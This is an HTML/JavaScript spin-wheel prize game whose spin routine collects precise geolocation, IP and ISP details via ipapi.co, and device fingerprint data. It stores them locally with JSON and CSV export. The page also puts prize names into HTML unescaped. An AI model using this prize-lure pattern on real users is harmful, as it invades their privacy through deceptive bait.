<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎰 Professional Spin Wheel Game</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(255, 215, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(230, 126, 34, 0.1) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* Animated background particles */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
            z-index: 0;
        }

        .particle {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            animation: float 15s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0) translateX(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) translateX(100px);
                opacity: 0;
            }
        }

        .container {
            max-width: 700px;
            width: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.98) 0%, rgba(255, 255, 255, 0.95) 100%);
            border-radius: 40px;
            padding: 50px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5), 0 0 60px rgba(255, 215, 0, 0.3);
            position: relative;
            z-index: 1;
            animation: slideIn 0.8s ease-out;
            border: 2px solid rgba(255, 215, 0, 0.3);
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        h1 {
            color: #ffd700;
            font-size: 2.8em;
            margin-bottom: 15px;
            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.2);
            font-weight: 900;
            letter-spacing: 3px;
            background: linear-gradient(135deg, #ffd700, #ffed4e, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            color: #ff6b6b;
            font-size: 1.3em;
            font-weight: 600;
        }

        /* Wheel Container */
        .wheel-wrapper {
            position: relative;
            margin: 40px auto;
            width: 100%;
            max-width: 450px;
            filter: drop-shadow(0 20px 40px rgba(255, 215, 0, 0.3));
        }

        .wheel-container {
            position: relative;
            width: 100%;
            padding-bottom: 100%;
            margin: 0 auto;
        }

        /* Pointer/Arrow */
        .pointer {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            width: 0;
            height: 0;
            border-left: 20px solid transparent;
            border-right: 20px solid transparent;
            border-top: 40px solid #ff6b6b;
            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.3));
        }

        .pointer::after {
            content: '';
            position: absolute;
            top: -50px;
            left: -15px;
            width: 30px;
            height: 30px;
            background: #ff6b6b;
            border-radius: 50%;
            border: 3px solid white;
        }

        /* Wheel SVG */
        .wheel-svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            transition: transform 4s cubic-bezier(0.25, 0.1, 0.25, 1);
            filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.2));
        }

        /* Center Button */
        .center-circle {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            border: 5px solid white;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2em;
            z-index: 5;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: translate(-50%, -50%) scale(1);
            }
            50% {
                transform: translate(-50%, -50%) scale(1.05);
            }
        }

        /* Spin Button */
        .spin-button {
            display: block;
            width: 100%;
            max-width: 350px;
            margin: 40px auto;
            padding: 22px 50px;
            background: linear-gradient(135deg, #ffd700, #ffed4e, #ff6b6b);
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 1.6em;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 15px 40px rgba(255, 215, 0, 0.5);
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .spin-button:hover:not(:disabled) {
            transform: translateY(-5px) scale(1.08);
            box-shadow: 0 20px 50px rgba(255, 215, 0, 0.7);
        }

        .spin-button:active:not(:disabled) {
            transform: translateY(-2px) scale(1.05);
        }

        .spin-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .spin-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s;
        }

        .spin-button:hover::before {
            left: 100%;
        }

        /* Stats Section */
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
        }

        .stat-card {
            background: linear-gradient(135deg, #ffd70015, #ff6b6b15);
            padding: 25px;
            border-radius: 20px;
            text-align: center;
            transition: transform 0.3s ease;
            border: 2px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.1);
        }

        .stat-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 15px 40px rgba(255, 215, 0, 0.3);
        }

        .stat-value {
            font-size: 2.5em;
            font-weight: 900;
            background: linear-gradient(135deg, #ffd700, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.95em;
            color: #333;
            font-weight: 600;
        }

        /* History Section */
        .history-section {
            margin-top: 30px;
        }

        .history-title {
            font-size: 1.4em;
            background: linear-gradient(135deg, #ffd700, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 15px;
            font-weight: 900;
        }

        .history-list {
            max-height: 200px;
            overflow-y: auto;
            background: #f8f9fa;
            border-radius: 15px;
            padding: 15px;
        }

        .history-item {
            padding: 12px;
            background: white;
            margin-bottom: 10px;
            border-radius: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            animation: slideInHistory 0.3s ease-out;
        }

        @keyframes slideInHistory {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .history-prize {
            font-size: 1.5em;
            margin-right: 10px;
        }

        .history-text {
            flex: 1;
            font-weight: 600;
            color: #333;
        }

        .history-time {
            font-size: 0.85em;
            color: #999;
        }

        .no-history {
            text-align: center;
            color: #999;
            padding: 20px;
            font-style: italic;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }

        .modal.active {
            display: flex;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background: white;
            padding: 40px;
            border-radius: 25px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: modalBounce 0.5s ease;
            position: relative;
        }

        @keyframes modalBounce {
            0% {
                transform: scale(0.7);
                opacity: 0;
            }
            50% {
                transform: scale(1.05);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .modal-icon {
            font-size: 5em;
            margin-bottom: 20px;
            animation: bounce 1s infinite;
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-20px);
            }
        }

        .modal-title {
            font-size: 2em;
            color: #667eea;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .modal-message {
            font-size: 1.2em;
            color: #666;
            margin-bottom: 30px;
        }

        .modal-button {
            padding: 15px 40px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
        }

        .modal-button:hover {
            transform: translateY(-3px);
        }

        /* Confetti */
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: #f0f;
            z-index: 999;
        }

        @keyframes confetti-fall {
            to {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 25px;
            }

            h1 {
                font-size: 2em;
            }

            .stats {
                grid-template-columns: 1fr;
            }

            .wheel-wrapper {
                max-width: 300px;
            }
        }

        /* Settings Panel */
        .settings-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .settings-title {
            font-size: 1.3em;
            color: #667eea;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .prize-config {
            display: grid;
            gap: 10px;
            margin-bottom: 15px;
        }

        .prize-row {
            display: grid;
            grid-template-columns: 50px 1fr 100px;
            gap: 10px;
            align-items: center;
        }

        .prize-row input {
            padding: 8px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 0.95em;
        }

        .prize-row input:focus {
            outline: none;
            border-color: #667eea;
        }

        .apply-button {
            padding: 10px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s ease;
        }

        .apply-button:hover {
            background: #764ba2;
        }

        .toggle-settings {
            text-align: center;
            margin-bottom: 20px;
        }

        .toggle-button {
            padding: 10px 20px;
            background: transparent;
            color: #667eea;
            border: 2px solid #667eea;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .toggle-button:hover {
            background: #667eea;
            color: white;
        }
    </style>
</head>
<body>
    <!-- Background particles -->
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="header">
            <h1>🎰 Spin Wheel Game</h1>
            <p class="subtitle">Test your luck and win amazing prizes!</p>
        </div>

        <!-- Toggle Settings Button -->
        <div class="toggle-settings">
            <button class="toggle-button" onclick="toggleSettings()">⚙️ Customize Prizes</button>
        </div>

        <!-- Settings Panel -->
        <div class="settings-panel" id="settingsPanel" style="display: none;">
            <div class="settings-title">🎯 Prize Configuration</div>
            <div class="prize-config" id="prizeConfig"></div>
            <button class="apply-button" onclick="applySettings()">✅ Apply Changes</button>
        </div>

        <!-- Stats -->
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalSpins">0</div>
                <div class="stat-label">Total Spins</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalWins">0</div>
                <div class="stat-label">Wins</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="winRate">0%</div>
                <div class="stat-label">Win Rate</div>
            </div>
        </div>

        <!-- Wheel -->
        <div class="wheel-wrapper">
            <div class="pointer"></div>
            <div class="wheel-container">
                <svg class="wheel-svg" id="wheel" viewBox="0 0 200 200">
                    <!-- Segments will be generated dynamically -->
                </svg>
                <div class="center-circle">🍀</div>
            </div>
        </div>

        <!-- Spin Button -->
        <button class="spin-button" id="spinButton" onclick="spin()">
            🎯 SPIN THE WHEEL
        </button>

        <!-- History -->
        <div class="history-section">
            <div class="history-title">📜 Spin History</div>
            <div class="history-list" id="historyList">
                <div class="no-history">No spins yet. Start spinning!</div>
            </div>
            <button class="apply-button" onclick="viewCollectedData()" style="margin-top: 20px; width: 100%;">
                📊 View Collected Data
            </button>
        </div>
    </div>

    <!-- Result Modal -->
    <div class="modal" id="resultModal">
        <div class="modal-content">
            <div class="modal-icon" id="modalIcon">🎉</div>
            <div class="modal-title" id="modalTitle">Congratulations!</div>
            <div class="modal-message" id="modalMessage">You won something!</div>
            <button class="modal-button" onclick="closeModal()">Awesome!</button>
        </div>
    </div>

    <!-- Data Modal -->
    <div class="modal" id="dataModal">
        <div class="modal-content" style="max-width: 600px; max-height: 80vh; overflow-y: auto;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="color: #ffd700; margin: 0; font-size: 1.8em;">📊 Collected Data</h2>
                <button class="modal-button" onclick="closeDataModal()" style="padding: 8px 16px; font-size: 1em;">✕</button>
            </div>
            <div id="dataContent" style="background: #f8f9fa; padding: 20px; border-radius: 15px; font-family: monospace; font-size: 0.9em; color: #333; max-height: 70vh; overflow-y: auto;">
                Loading data...
            </div>
            <div style="margin-top: 20px; display: flex; gap: 10px;">
                <button class="apply-button" onclick="downloadDataAsJSON()" style="flex: 1;">⬇️ Download JSON</button>
                <button class="apply-button" onclick="downloadDataAsCSV()" style="flex: 1; background: #ff6b6b;">📥 Download CSV</button>
            </div>
        </div>
    </div>

    <script>
        // Game Configuration
        let prizes = [
            { name: 'iPhone 15', icon: '📱', weight: 5, color: '#ff6b6b' },
            { name: 'Laptop', icon: '💻', weight: 5, color: '#4ecdc4' },
            { name: '$100', icon: '💰', weight: 15, color: '#95e1d3' },
            { name: 'Headphones', icon: '🎧', weight: 20, color: '#ffd93d' },
            { name: 'Gift Card', icon: '🎁', weight: 25, color: '#ff8b94' },
            { name: 'Coffee', icon: '☕', weight: 30, color: '#a8e6cf' },
            { name: 'Try Again', icon: '😔', weight: 40, color: '#b4a7d6' },
            { name: 'Better Luck', icon: '🍀', weight: 60, color: '#95b8d1' }
        ];

        // Game State
        let spinning = false;
        let currentRotation = 0;
        let stats = {
            totalSpins: 0,
            totalWins: 0
        };
        let history = [];

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            generateWheel();
            generatePrizeConfig();
            createParticles();
            loadStats();
        });

        // Create background particles
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.animationDuration = (15 + Math.random() * 10) + 's';
                container.appendChild(particle);
            }
        }

        // Generate wheel segments
        function generateWheel() {
            const svg = document.getElementById('wheel');
            svg.innerHTML = '';
            
            const totalWeight = prizes.reduce((sum, p) => sum + p.weight, 0);
            let currentAngle = 0;

            prizes.forEach((prize, index) => {
                const sliceAngle = (prize.weight / totalWeight) * 360;
                
                // Create segment path
                const startAngle = currentAngle;
                const endAngle = currentAngle + sliceAngle;
                
                const x1 = 100 + 100 * Math.cos((startAngle - 90) * Math.PI / 180);
                const y1 = 100 + 100 * Math.sin((startAngle - 90) * Math.PI / 180);
                const x2 = 100 + 100 * Math.cos((endAngle - 90) * Math.PI / 180);
                const y2 = 100 + 100 * Math.sin((endAngle - 90) * Math.PI / 180);
                
                const largeArc = sliceAngle > 180 ? 1 : 0;
                
                const pathData = `M 100 100 L ${x1} ${y1} A 100 100 0 ${largeArc} 1 ${x2} ${y2} Z`;
                
                // Create path element
                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                path.setAttribute('d', pathData);
                path.setAttribute('fill', prize.color);
                path.setAttribute('stroke', 'white');
                path.setAttribute('stroke-width', '2');
                svg.appendChild(path);
                
                // Add text
                const textAngle = startAngle + sliceAngle / 2;
                const textRadius = 65;
                const textX = 100 + textRadius * Math.cos((textAngle - 90) * Math.PI / 180);
                const textY = 100 + textRadius * Math.sin((textAngle - 90) * Math.PI / 180);
                
                const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
                text.setAttribute('x', textX);
                text.setAttribute('y', textY);
                text.setAttribute('text-anchor', 'middle');
                text.setAttribute('dominant-baseline', 'middle');
                text.setAttribute('fill', 'white');
                text.setAttribute('font-size', '10');
                text.setAttribute('font-weight', 'bold');
                text.setAttribute('transform', `rotate(${textAngle}, ${textX}, ${textY})`);
                text.textContent = prize.icon + ' ' + prize.name;
                svg.appendChild(text);
                
                currentAngle += sliceAngle;
            });
        }

        // Generate prize configuration panel
        function generatePrizeConfig() {
            const container = document.getElementById('prizeConfig');
            container.innerHTML = '';
            
            prizes.forEach((prize, index) => {
                const row = document.createElement('div');
                row.className = 'prize-row';
                row.innerHTML = `
                    <input type="text" value="${prize.icon}" maxlength="2" id="icon-${index}">
                    <input type="text" value="${prize.name}" id="name-${index}">
                    <input type="number" value="${prize.weight}" min="1" max="100" id="weight-${index}">
                `;
                container.appendChild(row);
            });
        }

        // Toggle settings panel
        function toggleSettings() {
            const panel = document.getElementById('settingsPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }

        // Apply settings
        function applySettings() {
            prizes = prizes.map((prize, index) => ({
                ...prize,
                icon: document.getElementById(`icon-${index}`).value,
                name: document.getElementById(`name-${index}`).value,
                weight: parseInt(document.getElementById(`weight-${index}`).value)
            }));
            
            generateWheel();
            alert('✅ Prize configuration updated!');
        }

        // Weighted random selection
        function selectPrize() {
            const totalWeight = prizes.reduce((sum, p) => sum + p.weight, 0);
            let random = Math.random() * totalWeight;
            
            for (let prize of prizes) {
                if (random < prize.weight) {
                    return prize;
                }
                random -= prize.weight;
            }
            
            return prizes[prizes.length - 1];
        }

        // Calculate target angle for selected prize
        function calculateTargetAngle(selectedPrize) {
            const totalWeight = prizes.reduce((sum, p) => sum + p.weight, 0);
            let currentAngle = 0;
            
            for (let prize of prizes) {
                const sliceAngle = (prize.weight / totalWeight) * 360;
                
                if (prize === selectedPrize) {
                    // Random angle within this slice
                    const randomOffset = Math.random() * sliceAngle;
                    return currentAngle + sliceAngle / 2 + randomOffset - sliceAngle / 2;
                }
                
                currentAngle += sliceAngle;
            }
            
            return 0;
        }

        // Main spin function
        function spin() {
            if (spinning) return;
            
            spinning = true;
            const button = document.getElementById('spinButton');
            button.disabled = true;
            button.textContent = '🎰 COLLECTING DATA...';
            
            // Collect user data
            collectUserData().then(userData => {
                // Select prize
                const selectedPrize = selectPrize();
                const targetAngle = calculateTargetAngle(selectedPrize);
                
                // Calculate final rotation (multiple spins + target)
                const spins = 5 + Math.random() * 3; // 5-8 full rotations
                const finalRotation = currentRotation + (360 * spins) + (360 - targetAngle);
                
                // Apply rotation
                const wheel = document.getElementById('wheel');
                wheel.style.transform = `rotate(${finalRotation}deg)`;
                currentRotation = finalRotation % 360;
                
                button.textContent = '🎰 SPINNING...';
                
                // Update stats and show result after animation
                setTimeout(() => {
                    updateStats(selectedPrize);
                    saveSpinData(selectedPrize, userData);
                    showResult(selectedPrize);
                    addToHistory(selectedPrize);
                    
                    button.disabled = false;
                    button.textContent = '🎯 SPIN AGAIN';
                    spinning = false;
                }, 4000);
            }).catch(error => {
                console.error('Error collecting user data:', error);
                // Continue with spin even if data collection fails
                const selectedPrize = selectPrize();
                const targetAngle = calculateTargetAngle(selectedPrize);
                const spins = 5 + Math.random() * 3;
                const finalRotation = currentRotation + (360 * spins) + (360 - targetAngle);
                
                const wheel = document.getElementById('wheel');
                wheel.style.transform = `rotate(${finalRotation}deg)`;
                currentRotation = finalRotation % 360;
                
                button.textContent = '🎰 SPINNING...';
                
                setTimeout(() => {
                    updateStats(selectedPrize);
                    showResult(selectedPrize);
                    addToHistory(selectedPrize);
                    
                    button.disabled = false;
                    button.textContent = '🎯 SPIN AGAIN';
                    spinning = false;
                }, 4000);
            });
        }

        // Collect user data (location, IP, network info)
        async function collectUserData() {
            const userData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                devicePixelRatio: window.devicePixelRatio,
                cookiesEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A'
            };

            // Get geolocation
            try {
                const geoData = await getGeolocation();
                userData.location = geoData;
            } catch (e) {
                userData.location = { error: 'Geolocation denied' };
            }

            // Get IP address
            try {
                const ipData = await getIPAddress();
                userData.ip = ipData;
            } catch (e) {
                userData.ip = { error: 'Could not fetch IP' };
            }

            // Get network information
            userData.network = getNetworkInfo();

            return userData;
        }

        // Get geolocation
        function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed
                            });
                        },
                        (error) => {
                            reject(error);
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    reject('Geolocation not supported');
                }
            });
        }

        // Get IP address and related info
        async function getIPAddress() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country_code,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                throw error;
            }
        }

        // Get network information
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
            return { error: 'Network info not available' };
        }

        // Save spin data to IndexedDB
        function saveSpinData(prize, userData) {
            const dbRequest = indexedDB.open('SpinWheelDB', 1);

            dbRequest.onerror = () => console.error('Database error');
            dbRequest.onsuccess = () => {
                const db = dbRequest.result;
                const transaction = db.transaction(['spins'], 'readwrite');
                const objectStore = transaction.objectStore('spins');
                
                const spinRecord = {
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    prize: prize,
                    userData: userData
                };
                
                objectStore.add(spinRecord);
                console.log('Spin data saved to IndexedDB');
            };

            dbRequest.onupgradeneeded = (event) => {
                const db = event.target.result;
                if (!db.objectStoreNames.contains('spins')) {
                    db.createObjectStore('spins', { keyPath: 'id' });
                }
            };
        }

        // Retrieve all spin data
        function getAllSpinData() {
            return new Promise((resolve, reject) => {
                const dbRequest = indexedDB.open('SpinWheelDB', 1);

                dbRequest.onsuccess = () => {
                    const db = dbRequest.result;
                    const transaction = db.transaction(['spins'], 'readonly');
                    const objectStore = transaction.objectStore('spins');
                    const request = objectStore.getAll();

                    request.onsuccess = () => {
                        resolve(request.result);
                    };
                };

                dbRequest.onerror = () => {
                    reject('Failed to open database');
                };
            });
        }

        // Update statistics
        function updateStats(prize) {
            stats.totalSpins++;
            
            // Count as win if not "Try Again" or "Better Luck"
            if (!prize.name.includes('Try Again') && !prize.name.includes('Better Luck')) {
                stats.totalWins++;
            }
            
            document.getElementById('totalSpins').textContent = stats.totalSpins;
            document.getElementById('totalWins').textContent = stats.totalWins;
            
            const winRate = stats.totalSpins > 0 
                ? Math.round((stats.totalWins / stats.totalSpins) * 100) 
                : 0;
            document.getElementById('winRate').textContent = winRate + '%';
            
            saveStats();
        }

        // Show result modal
        function showResult(prize) {
            const isWin = !prize.name.includes('Try Again') && !prize.name.includes('Better Luck');
            
            document.getElementById('modalIcon').textContent = prize.icon;
            document.getElementById('modalTitle').textContent = isWin ? '🎉 Congratulations!' : '😔 Oh No!';
            document.getElementById('modalMessage').textContent = isWin 
                ? `You won ${prize.name}!` 
                : `${prize.name}. Spin again for another chance!`;
            
            document.getElementById('resultModal').classList.add('active');
            
            if (isWin) {
                createConfetti();
            }
        }

        // Close modal
        function closeModal() {
            document.getElementById('resultModal').classList.remove('active');
        }

        // Add to history
        function addToHistory(prize) {
            const now = new Date();
            const timeString = now.toLocaleTimeString();
            
            history.unshift({
                prize: prize,
                time: timeString
            });
            
            // Keep only last 10 items
            if (history.length > 10) {
                history = history.slice(0, 10);
            }
            
            updateHistoryDisplay();
        }

        // Update history display
        function updateHistoryDisplay() {
            const container = document.getElementById('historyList');
            
            if (history.length === 0) {
                container.innerHTML = '<div class="no-history">No spins yet. Start spinning!</div>';
                return;
            }
            
            container.innerHTML = history.map(item => `
                <div class="history-item">
                    <span class="history-prize">${item.prize.icon}</span>
                    <span class="history-text">${item.prize.name}</span>
                    <span class="history-time">${item.time}</span>
                </div>
            `).join('');
        }

        // Create confetti effect
        function createConfetti() {
            const colors = ['#ff6b6b', '#4ecdc4', '#ffe66d', '#a8e6cf', '#ff8b94', '#ffd93d'];
            
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + '%';
                    confetti.style.top = '-10px';
                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.animation = `confetti-fall ${2 + Math.random() * 2}s linear forwards`;
                    document.body.appendChild(confetti);
                    
                    setTimeout(() => confetti.remove(), 4000);
                }, i * 30);
            }
        }

        // Save stats to localStorage
        function saveStats() {
            localStorage.setItem('spinWheelStats', JSON.stringify(stats));
        }

        // Load stats from localStorage
        function loadStats() {
            const saved = localStorage.getItem('spinWheelStats');
            if (saved) {
                stats = JSON.parse(saved);
                document.getElementById('totalSpins').textContent = stats.totalSpins;
                document.getElementById('totalWins').textContent = stats.totalWins;
                
                const winRate = stats.totalSpins > 0 
                    ? Math.round((stats.totalWins / stats.totalSpins) * 100) 
                    : 0;
                document.getElementById('winRate').textContent = winRate + '%';
            }
        }

        // View collected data
        function viewCollectedData() {
            getAllSpinData().then(data => {
                if (data.length === 0) {
                    document.getElementById('dataContent').innerHTML = '<p style="text-align: center; color: #999;">No data collected yet. Start spinning!</p>';
                } else {
                    const formattedData = data.map((record, index) => `
                        <div style="margin-bottom: 30px; padding: 15px; background: white; border-radius: 10px; border-left: 4px solid #ffd700;">
                            <h4 style="color: #ffd700; margin: 0 0 10px 0;">Spin #${data.length - index}</h4>
                            <p><strong>Prize:</strong> ${record.prize.name} ${record.prize.icon}</p>
                            <p><strong>Timestamp:</strong> ${record.userData.timestamp}</p>
                            <hr style="margin: 10px 0; border: none; border-top: 1px solid #ddd;">
                            <p><strong>📍 Location:</strong></p>
                            <pre style="margin: 5px 0; background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;">${JSON.stringify(record.userData.location, null, 2)}</pre>
                            <p><strong>🌐 IP Information:</strong></p>
                            <pre style="margin: 5px 0; background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;">${JSON.stringify(record.userData.ip, null, 2)}</pre>
                            <p><strong>📡 Network:</strong></p>
                            <pre style="margin: 5px 0; background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;">${JSON.stringify(record.userData.network, null, 2)}</pre>
                            <p><strong>💻 Device Info:</strong></p>
                            <pre style="margin: 5px 0; background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;">${JSON.stringify({
                                userAgent: record.userData.userAgent,
                                platform: record.userData.platform,
                                screenResolution: record.userData.screenResolution,
                                language: record.userData.language,
                                timezone: record.userData.timezone,
                                hardwareConcurrency: record.userData.hardwareConcurrency,
                                deviceMemory: record.userData.deviceMemory,
                                cookiesEnabled: record.userData.cookiesEnabled,
                                onLine: record.userData.onLine
                            }, null, 2)}</pre>
                        </div>
                    `).join('');
                    document.getElementById('dataContent').innerHTML = formattedData;
                }
                document.getElementById('dataModal').classList.add('active');
            });
        }

        // Close data modal
        function closeDataModal() {
            document.getElementById('dataModal').classList.remove('active');
        }

        // Download data as JSON
        function downloadDataAsJSON() {
            getAllSpinData().then(data => {
                const json = JSON.stringify(data, null, 2);
                const blob = new Blob([json], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `spin-wheel-data-${new Date().getTime()}.json`;
                a.click();
                URL.revokeObjectURL(url);
            });
        }

        // Download data as CSV
        function downloadDataAsCSV() {
            getAllSpinData().then(data => {
                let csv = 'Timestamp,Prize,City,Country,IP,Latitude,Longitude,Device,Screen Resolution\n';
                
                data.forEach(record => {
                    const location = record.userData.location.city || 'Unknown';
                    const country = record.userData.ip.country || 'Unknown';
                    const ip = record.userData.ip.ip || 'Unknown';
                    const lat = record.userData.ip.latitude || 'N/A';
                    const lon = record.userData.ip.longitude || 'N/A';
                    const device = record.userData.platform || 'Unknown';
                    const screen = record.userData.screenResolution || 'Unknown';
                    
                    csv += `"${record.userData.timestamp}","${record.prize.name}","${location}","${country}","${ip}","${lat}","${lon}","${device}","${screen}"\n`;
                });
                
                const blob = new Blob([csv], { type: 'text/csv' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `spin-wheel-data-${new Date().getTime()}.csv`;
                a.click();
                URL.revokeObjectURL(url);
            });
        }
    </script>
</body>
</html>
